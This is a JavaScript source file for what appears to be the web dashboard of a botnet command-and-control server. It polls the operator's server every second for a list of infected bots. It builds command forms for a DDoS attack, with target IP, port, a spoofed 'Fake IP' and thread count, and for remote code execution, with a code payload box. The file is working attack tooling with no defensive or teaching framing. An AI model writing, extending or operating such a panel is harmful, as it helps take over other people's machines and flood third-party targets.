let serverURL = null;

function saveServerUrl(button) {
    serverURL = document.getElementById('serverUrl').value;
    button.disabled = true;
    button.innerText = "Saved !"
    setTimeout(() => {
        button.disabled = false;
        button.innerText = "Save"
    }, 1000);
}

function parseBotnets(botnets) {
    for (let i = 0; i < botnets.length; i++) {
        botnets[i] = JSON.parse(botnets[i]);
    }
    return botnets
}

function getBotnets() {
    if (!serverURL || serverURL === '')
        return;

    const xhr = new XMLHttpRequest();
    xhr.open('GET', `${serverURL}/botnets`);
    xhr.onload = () => {
        const botnets = parseBotnets(JSON.parse(xhr.responseText));
        renderBotnets(botnets)
    }
    xhr.send();
}

function renderBotnets(botnets) {
    const botnetContainer = document.getElementsByClassName('botnet-activity')[0];
    // Delete children
    botnetContainer.innerHTML = '';

    // Render botnets
    for (const botnet of botnets) {
        botnetContainer.insertAdjacentHTML('beforeend', `
            <div class="botnet">
                <b>${botnet.uuid}</b>
                <p>${botnet.count} - ${botnet.last_seen}</p>
            </div>
        `)
    }
}

function generateCommandConfigurationForm(command) {
    const configContainer = document.getElementById('command-configuration');
    const commandDef = getCommandConfig(command)
    configContainer.innerHTML = '';
    for (const key of Object.keys(commandDef)) {
        configContainer.insertAdjacentHTML('beforeend', `
            <div style="margin-bottom: 10px">
                <p style="display: inline;">${commandDef[key].label}</p>
                ${getInput(commandDef[key].type, key, commandDef[key].value)}
                
            </div>
        `);
    }
}

function getInput(type, key, value) {
    switch (type) {
        case 'text':
            return `<input type="text" name=${key} placeholder="${key}" value="${value}" />`
        case 'number':
            return `<input type="number" name=${key} placeholder="${key}" value="${value}" />`
        case 'textarea':
            return `<textarea name=${key} placeholder="${key}">${value}</textarea>`
    }
}

function getCommandConfig(name) {
    const command = { type: { type: 'text', value: name, label: "Type" } };
    switch (name) {
        case 'ddos':
            Object.assign(command, {
                target_ip: { type: "text", value: "", label: "Target IP" },
                target_port: { type: "text", value: "80", label: "Target Port" },
                fake_ip: { type: "text", value: "", label: "Fake IP" },
                nb_threads: { type: "text", value: "20", label: "Number of threads" }
            });
            break;

        case 'rce':
            Object.assign(command, {
                payload: { type: "textarea", value: "", label: "Code payload" }
            });
            break;
    }
    return command;
}

window.addEventListener('load', function () {
    this.setInterval(getBotnets, 1000);
})